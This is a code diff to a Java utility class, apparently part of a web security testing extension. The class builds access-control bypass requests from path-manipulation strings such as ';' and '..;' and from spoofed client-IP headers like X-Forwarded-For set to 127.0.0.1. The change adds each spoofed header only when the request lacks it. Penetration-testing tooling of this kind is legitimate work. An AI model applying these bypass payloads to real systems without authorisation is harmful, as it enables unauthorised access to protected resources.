@@ -6,12 +6,13 @@ import java.net.URL;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
+import java.util.stream.Collectors;
 
 public class BypassPayloadUtils {
     public static final String[] URL_BYPASS = new String[]{
             ".",
             ";",
-            "..;",
+//            "..;",
 /*            ";%09..;",
             ";%09..",
             ";%2f..",
@@ -23,17 +24,17 @@ public class BypassPayloadUtils {
             "%2f"*/
     };
     public static final String[] HEADER_BYPASS = new String[]{
-            "Client-IP: 127.0.0.1",
-            "X-Real-IP: 127.0.0.1",
-            "Redirect: 127.0.0.1",
-            "Referer: 127.0.0.1",
-            "-Client-IP: 127.0.0.1",
-            "X-Custom-IP-Authorization: 127.0.0.1",
-            "X-Forwarded-By: 127.0.0.1",
-            "X-Forwarded-For: 127.0.0.1",
-            "X-Forwarded-Host: 127.0.0.1",
-            "X-Forwarded-Port: 80",
-            "X-True-IP: 127.0.0.1"
+            "Client-IP",
+            "X-Real-IP",
+            "Redirect",
+            "Referer",
+            "X-Client-IP",
+            "X-Custom-IP-Authorization",
+            "X-Forwarded-By",
+            "X-Forwarded-For",
+            "X-Forwarded-Host",
+            "X-Forwarded-Port",
+            "X-True-IP"
     };
     public static final String[] GET_SKIPED_HEADERS = new String[]{"content-type", "content-length"};
 
@@ -58,8 +59,11 @@ public class BypassPayloadUtils {
                     "GET " + url.getPath() + " HTTP/1.1"
             );
         }};
+        List<String> headerBypass = new ArrayList(Arrays.asList(HEADER_BYPASS));
         for (int i = 1; i < originHeaders.size(); i++) { //skip url line.
             HttpHeader header = new HttpHeader(originHeaders.get(i));
+            List<String> needSkipheader = headerBypass.stream().filter(h -> h.equalsIgnoreCase(header.Name)).collect(Collectors.toList());
+            needSkipheader.forEach(headerBypass::remove);
             if (Arrays.stream(GET_SKIPED_HEADERS).anyMatch(e -> e.equalsIgnoreCase(header.Name))) {
                 continue;
             } else {
@@ -70,7 +74,15 @@ public class BypassPayloadUtils {
                 }
             }
         }
-        headers.addAll(Arrays.asList(HEADER_BYPASS));
+        for (String headerName : headerBypass) {
+            switch (headerName) {
+                case "X-Forwarded-Port":
+                    headers.add(String.format("%s: %s", headerName, url.getPort()));
+                    break;
+                default:
+                    headers.add(String.format("%s: %s", headerName, "127.0.0.1"));
+            }
+        }
         return Utils.Helpers.buildHttpMessage(headers, null);
     }
 
